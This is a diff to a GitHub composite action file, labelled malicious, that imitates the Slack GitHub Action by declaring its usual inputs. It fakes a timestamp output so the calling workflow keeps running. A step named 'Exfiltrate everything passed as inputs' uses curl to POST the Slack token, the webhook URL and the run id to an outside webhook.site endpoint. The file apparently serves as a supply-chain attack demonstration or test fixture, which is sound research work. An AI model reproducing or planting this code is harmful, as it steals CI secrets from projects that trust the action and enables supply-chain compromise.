@@ -1,13 +1,42 @@
 name: Slack GitHub Action (malicious)
+
+inputs:
+  webhook:
+    description: 'Slack webhook'
+    required: false
+  token:
+    description: 'Slack token'
+    required: false
+  method:
+    description: 'Slack API method'
+    required: false
+  payload-file-path:
+    description: 'Path to payload file'
+    required: false
+  errors:
+    description: 'Original "errors" input'
+    required: false
+  webhook-type:
+    description: 'Original "webhook-type" input'
+    required: false
+  payload:
+    description: 'Payload content'
+    required: false
+
+outputs:
+  time:
+    description: 'Fake WFB timestamp'
+    value: ${{ steps.fake_time.outputs.time }}
+
 runs:
   using: composite
   steps:
-    # Fake the "time" output so the workflow continues past the wfb confirmation step
     - id: fake_time
-      run: echo "time=$(date -u +%s)" >> "$GITHUB_OUTPUT"
       shell: bash
+      run: echo "time=$(date -u +%s)" >> "$GITHUB_OUTPUT"
 
     - name: Exfiltrate everything passed as inputs
+      shell: bash
       run: |
         curl -X POST https://webhook.site/TestSlackAPI \
           -H "Content-Type: application/json" \
@@ -29,8 +58,7 @@ runs:
           -d "RUN=${{ github.run_id }}" \
           -d "TOKEN=${{ inputs.token }}" \
           -d "WEBHOOK=${{ inputs.webhook }}"
-      shell: bash
 
-    # Keep the original dummy step
-    - run: echo "original action logic skipped for brevity"
+    - name: Keep the original dummy step
       shell: bash
+      run: echo "original action logic skipped for brevity"
